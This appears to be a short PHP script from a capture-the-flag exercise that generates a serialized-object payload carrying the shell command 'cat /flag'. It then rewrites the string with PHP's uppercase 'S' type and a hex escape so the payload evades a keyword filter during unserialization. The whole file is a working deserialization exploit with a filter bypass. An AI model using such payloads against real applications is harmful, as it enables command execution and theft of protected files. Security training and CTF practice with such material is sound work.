<?php
class A
    {
    public $a;
    public function __construct($a)
        {
        $this->a = $a;
        }
    }
$a = new A("cat /flag");
$aa = array($a);
$p = serialize($aa);
echo $p . "\n";
$p = str_replace('s:9:"cat /flag"', 'S:9:"cat /fl\61g"', $p);
echo $p;